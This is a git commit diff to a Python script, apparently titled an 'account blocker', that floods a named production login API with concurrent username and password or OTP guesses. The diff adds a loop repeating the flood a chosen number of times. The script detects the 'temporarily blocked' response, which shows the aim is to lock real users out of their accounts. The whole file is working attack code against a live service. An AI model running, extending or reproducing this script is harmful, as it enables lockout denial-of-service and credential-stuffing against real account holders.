4216e45627218ac5144d3997068bc519b72d2290
Achu <87751449+appuachu@users.noreply.github.com>
2023-02-18 15:26:32 +0530

    Update ezygo_account_blocker.py

--- ezygo_account_blocker.py
+++ ezygo_account_blocker.py
@@ -2,22 +2,26 @@ import requests
 import concurrent.futures
 
 user_file = input("Enter the user file: ")
+num_requests = int(input("Enter the number of requests to send: "))
 
 url = 'https://production.api.ezygo.app/api/v1/Xcr45_salt/login'
 
 with open(user_file, 'r') as f:
     usernames = [line.strip() for line in f]
 
-with open('pass.txt', 'r') as f:
+with open('otp.txt', 'r') as f:
     passwords = [line.strip() for line in f]
 
 def send_request(user, pwd):
     data = {'username': user, 'password': pwd}
     response = requests.post(url, json=data)
     if "Your account has been temporarly blocked" in response.text:
-        print(f' {user} : Your account has been temporarly blocked for 2 hours')
+        print(f' {user} : Your account has been temporarly blocked for 2 houres')
 
-with concurrent.futures.ThreadPoolExecutor() as executor:
-    for user in usernames:
-        for pwd in passwords:
-            executor.submit(send_request, user, pwd)
+for i in range(num_requests):
+    print(f"Sending request {i+1}/{num_requests}")
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        for user in usernames:
+            for pwd in passwords:
+                executor.submit(send_request, user, pwd)
+
